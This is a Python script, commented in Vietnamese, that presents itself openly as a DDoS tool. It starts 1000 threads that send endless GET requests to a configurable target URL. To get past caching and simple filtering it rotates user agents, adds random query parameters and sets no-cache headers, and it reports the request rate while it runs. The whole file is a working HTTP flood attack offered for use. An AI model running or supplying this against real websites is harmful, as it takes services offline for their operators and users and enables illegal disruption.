import requests
import threading
import time
import random
from colorama import Fore, init

init(autoreset=True)

# ========== CẤU HÌNH ==========
TARGET_URL = "http://example.com"  # Thay URL mục tiêu
THREADS = 1000                      # Số luồng tấn công
DURATION = 999999                   # Thời gian chạy (giây)
# ===============================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

request_count = 0
lock = threading.Lock()

def attack():
    global request_count
    session = requests.Session()
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
            # Gửi GET với tham số ngẫu nhiên tránh cache
            params = {"_": random.randint(1, 999999)}
            response = session.get(TARGET_URL, headers=headers, params=params, timeout=2)
            
            with lock:
                request_count += 1
                if request_count % 100 == 0:
                    print(f"{Fore.GREEN}[+] Tổng request: {request_count} | Status: {response.status_code}")
        except:
            with lock:
                request_count += 1
                if request_count % 100 == 0:
                    print(f"{Fore.RED}[!] Tổng request: {request_count} | Lỗi kết nối")

# Khởi tạo luồng
print(f"{Fore.CYAN}[*] Bắt đầu DDoS vào {TARGET_URL} với {THREADS} luồng...")
print(f"{Fore.YELLOW}[*] Nhấn Ctrl+C để dừng\n")

threads = []
for i in range(THREADS):
    t = threading.Thread(target=attack, daemon=True)
    t.start()
    threads.append(t)

# Đếm thời gian
start_time = time.time()
try:
    while time.time() - start_time < DURATION:
        time.sleep(1)
        with lock:
            rps = request_count / (time.time() - start_time)
            print(f"{Fore.BLUE}[STAT] RPS: {rps:.1f} | Total: {request_count}")
except KeyboardInterrupt:
    print(f"\n{Fore.RED}[!] Dừng bởi người dùng. Tổng request: {request_count}")